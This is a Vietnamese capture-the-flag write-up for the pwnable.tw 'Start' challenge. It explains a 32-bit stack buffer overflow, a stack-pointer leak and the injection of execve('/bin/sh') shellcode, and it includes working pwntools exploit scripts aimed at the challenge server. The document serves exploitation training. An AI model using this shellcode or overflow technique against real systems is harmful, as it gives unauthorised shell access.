# Pwnable.tw - Start
# Preview
https://pwnable.tw/challenge/#1


![image](https://user-images.githubusercontent.com/90976397/175880176-b2aaf146-d684-4e84-afa7-504fbd3be629.png)

 ```"Just a start" như mô tả của challenge này, chỉ là một sự khởi đầu ( nghe khá là simple :D, hoặc là không) ```

Tải file binary về và check xem thử nó cho ta những gì. 

![image](https://user-images.githubusercontent.com/90976397/175884743-683e415b-e2e6-4dc9-9733-1dfcd954d1d3.png)



![image](https://user-images.githubusercontent.com/90976397/175884807-838589d1-163d-4ad3-b138-c6ece7c57af8.png)

* Một file ELF executable 32-bit và không bị stripped

Check xem thử có những mitigation nào

![image](https://user-images.githubusercontent.com/90976397/175885003-ccb50269-6c33-4629-b134-9860e8658094.png)

* Tất cả mitigation đều bị disable :DD. Một vùng đất màu mỡ để khai thác :) 

Let's see what it does 

![image](https://user-images.githubusercontent.com/90976397/175885844-aa895b96-065f-43a2-9b01-f9875cc7f257.png) 

* Một chương trình khá là basic, pop up lên 1 chuỗi "Let's start the CTF:" và sau đó cho chúng ta nhập 1 chuỗi bất kỳ. 

Ngó qua một chút về những function mà chúng ta có thể làm việc 

![image](https://user-images.githubusercontent.com/90976397/175886352-51883eed-aa36-4439-82c6-f624c9b632bf.png)

Có vẻ như chương trình chỉ cho chúng ta làm việc loanh quanh ở hàm start

Quăng nó vô IDA để disassemble xem nó cho ta những thứ gì.
> Btw bạn có thể quăng nó vô bất kỳ cái nào (miễn là có chức năng disassemble :) ) để có thể disassemble file xem thử nó có cái gì ở trong đó, mình recommend nên dùng IDA hoặc Ghidra vì hai cái này nó rất là đa năng và có ích trong việc giải một câu binary pwn, ngoài ra bạn có thể debug bằng một trong hai cái đó, rất là useful :D. 

> Dành cho những bạn mới chơi thì mình khuyến khích các bạn đọc assembly code thay vì nhấn f5 để đọc pseudocode, việc này giúp các bạn hiểu file một cách tường tận và rõ hơn về các chức năng của các hàm cũng như xem thử lỗi nó nằm ở đâu và lỗi như nào. 

![3ofv7m](https://user-images.githubusercontent.com/90976397/175890901-50b50e64-cfd2-4724-82bb-7babe46deb9c.png)



* Hàm start rất là đơn giản 

![image](https://user-images.githubusercontent.com/90976397/175888356-077a2d13-d2a5-4d4b-9245-70cabe8c67be.png)

Mổ xẻ cái hàm này nào :DD 

![image](https://user-images.githubusercontent.com/90976397/175891190-214acf7a-06ef-4c3f-b78c-c6828cdcd080.png)

* stack pointer và offset của hàm exit được đẩy vào stack 
* tất cả thanh ghi eax, ebx, ecx, edx đều được clear (dành cho những bạn nào chưa biết thì hàm xor khi xor với chính nó thì sẽ bằng 0)

![image](https://user-images.githubusercontent.com/90976397/175892310-c6a26f3f-e6b1-4bb4-9423-b33dacbae285.png)

* sau đó nó đẩy chuỗi "Let's start the CTF:" vô stack 

![image](https://user-images.githubusercontent.com/90976397/175892914-bc4e3154-055b-4cdb-8f33-45f4e5be733b.png)

* mov ecx, esp: nó đẩy stack pointer vô ecx. Điều này có nghĩa là ecx sẽ giữ cái con trỏ, trỏ đến cái chuỗi mà chúng ta sẽ làm việc ở đó. 
* mov dl, 14h: dl đóng vai trò như là size của cái chuỗi mà chúng ta thực hiện. 0x14 đổi qua decimal là 20. 
* mov bl, 1: bl được định nghĩa là file descriptor. Có nghĩa là chúng ta sẽ sử dụng stdout. 
* mov al, 4: al được định nghĩa là syscall nào mà chúng ta muốn gọi, ở đây là 4 có nghĩa syscall chúng ta muốn gọi là sys_write. 
> int 80h: theo định nghĩa ở trên stackoverflow thì: "INT is the assembly mnemonic for "interrupt". The code after it specifies the interrupt code. (80h/0x80 or 128 in decimal is the Unix System Call interrupt) When running in Real Mode (16-bit on a 32-bit chip), interrupts are handled by the BIOS". Mình đọc xong cũng chả hiểu cái vẹo gì  :)). Nói tóm lại int 80h nó giống như là một cái tín hiệu để ngắt quãng cái flow của chương trình để chuyển flow của chương trình sang interrupt handler ở đây là 0x80. Ở linux, 0x80 được định nghĩa là một system call, hệ thống chuyển đổi control sang kernel và định nghĩa những gì mà mình muốn làm bằng việc đưa những giá trị cụ thể sang các thanh ghi, trong trường hợp này đó là những gì mà chúng ta định nghĩa ở trên.

> Tổng kết lại ở trên có nghĩa là chúng ta sẽ lấy 20 characters từ stack và in ra màn hình console của user thông qua hàm sys_write.

# Tìm lỗi của chương trình

![828c021948f0bca9_49d6d372a69f13d5_5419315382339926185710](https://user-images.githubusercontent.com/90976397/175903627-b380acd4-b575-4ef8-96f0-4c48ac2c09a2.jpg)

Sau khi chơi pwn được 1 khoảng thời gian thì mỗi lần chạy file binary mình sẽ check những lỗi cơ bản đầu tiên ví dụ như là: format string, buffer overflow, .....

![image](https://user-images.githubusercontent.com/90976397/175905326-136bd64b-02c8-4962-a90c-35653e3c8352.png)

Đúng như mình dự đoán lỗi đầu tiên đó là buffer overflow. Khi thử nhập nhiều chữ a hoặc bất kỳ ký tự nào bạn muốn. Chúng ta có thể confirm bằng việc sau khi nhập một chuỗi dài thì chương trình sẽ bị ngắt quãng và in ra Segmentation fault. 
Khi bạn đã đạt đến level để chơi pwnable.tw thì có lẽ bạn đã biết phần nào về lỗi buffer overflow. Nhưng nếu bạn không biết thì cũng không sao, đã có mình ở đây rồi :D. 
> Lỗi buffer overflow được định nghĩa là tràn bộ đệm, có nghĩa là khi chương trình đọc input của 1 biến nào đó vượt qua giới hạn của chính nó thì nó sẽ ghi đè xuống bất kể thứ gì ở dưới nó, điều này có thể dẫn tới việc bạn có thể ghi đè hoặc là leak ra thứ gì bạn muốn. Bạn có thể tưởng tượng đơn giản như này, bạn có một chai nước và một con dao, khi bạn lấy đầu con dao đâm một lực vừa đủ thì bạn có thể làm cho nó chảy nước ra ngoài. Btw, để có thể ngăn lỗi này thì cơ chế bảo vệ canary ra đời. 

Để tận dụng được lỗi này chúng ta phải tìm được offset để có thể gây ra lỗi tràn bộ nhớ đệm (Ở một bài khác mình sẽ giải thích rõ cách này). Có khá là nhiều cách để có thể tìm, ở bài này mình dùng cách khá là automatically nhưng mình khuyến khích các bạn nên tìm theo cách lấy offset của eip trừ cho offset của buffer, cách này sẽ giúp các bạn hiểu rõ hơn về lỗi buffer overflow.
* Đầu tiên mình sẽ tạo 1 chuỗi 50 ký tự 
![image](https://user-images.githubusercontent.com/90976397/175947712-991b2977-4a5d-4f55-bae5-ced62cc08d65.png)

* Sau đó dùng chuỗi vừa tạo làm input cho chương trình 

![image](https://user-images.githubusercontent.com/90976397/175947881-b4ebc347-0240-48da-9a25-a9008fed812d.png)

![image](https://user-images.githubusercontent.com/90976397/175948822-f3d6337c-ce6e-4791-8fd6-83011be71146.png)

* Có vẻ như offset để có thể fill hết buffer là 20 và sau đó 4 byte tiếp theo là của return address, chúng ta có thể confirm thông qua việc nhập 20 chữ a cộng với 4 chữ b

![image](https://user-images.githubusercontent.com/90976397/175949665-f4b8f8be-9629-4d93-873a-2adcbb577677.png)

Và sau đó lỗi buffer overflow triggered và return address là 0x62626262 (4 chữ b). Thế là chúng ta đã có thể ghi đè return address.



Còn gì tuyệt vời hơn việc canary ở chương trình này đã tắt đó chính là NX disable :DD 
> NX (non executable) là một cơ chế dùng để ngăn chặn attacker inject shellcode execute trực tiếp trên stack bằng việc hạn chế một số ô nhớ cụ thể và thực thi NX bit. Tuy nhiên cơ chế bảo vệ này vẫn có cách để bypass, cách phổ biến nhất đó là return to libc (cách attack này mình sẽ nói sau)

```Tổng kết lại chúng ta có lỗi buffer overflow để tấn công. Cách attack rất là đơn giản, chúng ta chỉ cần truyền shellcode lên stack và execute nó, sau đó chúng ta sẽ có được shell :DD (sound pretty easy LOL :) )```

Vậy làm sao để chúng ta có thể inject shellcode lên stack? 
* Đầu tiên chúng ta phải có một con trỏ để trỏ đến stack, nhưng địa stack pointer luôn thay đổi ở memory mỗi lần chúng ta chạy chương trình, chúng ta phải tìm 1 cách để có thể có được địa chỉ của stack pointer. Quay lại assembly code và đọc (Mình đã nói đọc assembly code quan trọng mà :)) chúng ta có thể thấy được stack pointer được push vào stack ngay lúc chương trình bắt đầu

![image](https://user-images.githubusercontent.com/90976397/175945499-bfde7bb1-1dfa-411c-9370-fd4f65fe6c3c.png)

Hãy đặt 2 breakpoint, breakpoint thứ nhất tại lúc ngay sau khi stack pointer được push vào stack, cái thứ 2 là tại ret instruction 

![image](https://user-images.githubusercontent.com/90976397/175946278-e850a718-ce85-4b23-a591-3530441bd500.png)

Chúng ta có thể thấy địa chỉ của stack pointer được đẩy lên trên cùng.

![image](https://user-images.githubusercontent.com/90976397/175950678-11b976eb-49cf-4699-896e-4a46758c7df9.png)

> Bây giờ thứ chúng ta đã có là chúng ta có thể control được return address và stack pointer ở trên là thứ chúng ta cần phải leak, chúng ta có thể lợi dụng những gì chương trình có được để có thể leak. Quay lại đọc assembly code :D. Tại offset 0x08048087 chính là để bắt đầu in nội dung ở stack (ở đây chính là stack pointer) ra console. Và 4 byte đầu được in ra chính là stack pointer mà chúng ta cần ở đầu chương trình. Và đó chính là cách mà chúng ta sẽ thực hiện.
```
from pwn import *
r = process('./start')
payload = b'a'*20 + p32(0x08048087) #20 chữ a là để fill buffer, p32(0x08048087) để ghi đè return address về 0x08048087
r.sendafter(b':',payload)
leak = r.recv()[0:4] 
print(leak)
esp = u32(leak)
log.info('esp: '+hex(esp))
r.interactive()
```
![image](https://user-images.githubusercontent.com/90976397/175954741-cdfe281b-e89f-4c78-a4b2-632ce353c320.png)

Và từ đó chúng ta đã có thể leak được địa chỉ của stack pointer

Sau khi có được địa chỉ của stack pointer thì bước cuối cùng đó là chèn shellcode vào stack và execute nó. Nhưng mà có 1 lưu ý nho nhỏ đó là sau khi chúng ta đã leak được stack pointer rồi nhưng mà thực tế stack pointer nó không trỏ chính xác đến stack mà nó trỏ đến 20 byte đằng sau stack, để payload có thể chạy okelah thì chúng ta phải add 20 byte vào sau địa chỉ của stack pointer. 
Btw, một câu nói mình đã nghe đâu đó, "đừng có lạm dụng những thứ có sẵn quá nhiều, nên code ra để xem thử nó ra sao", nếu bạn là người mới chơi thì nên tự code shellcode để xem nó ra sao thay vì lên shellstorm lấy shellcode có sẵn. 
Và đây là exploit cuối của mình 

```
from pwn import * 
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

r = remote("chall.pwnable.tw",10000)
#r = process('./start')
payload = b'a'*20 + p32(0x08048087) #20 chữ a là để fill buffer, p32(0x08048087) để ghi đè return address về 0x08048087
r.sendafter(b':',payload)
leak = r.recv()[0:4] #
print(leak)
esp = u32(leak)
log.info('esp: '+hex(esp))
payload = b'a'*20 + p32(esp + 20) + shellcode
r.send(payload)
r.interactive()
```

![image](https://user-images.githubusercontent.com/90976397/175957620-212eb1c9-8313-441e-a2b4-879b6c73913d.png)

Cảm ơn bạn vì đã đọc hết. Nếu như bạn không hiểu gì thì hãy ngồi viết ra và suy ngẫm lại xem mình đang mắc ở đâu và fix nó như nào. 

-y198-

![kientri](https://user-images.githubusercontent.com/90976397/175959023-4e678907-b395-4b52-9cc9-04fd382d8272.png)











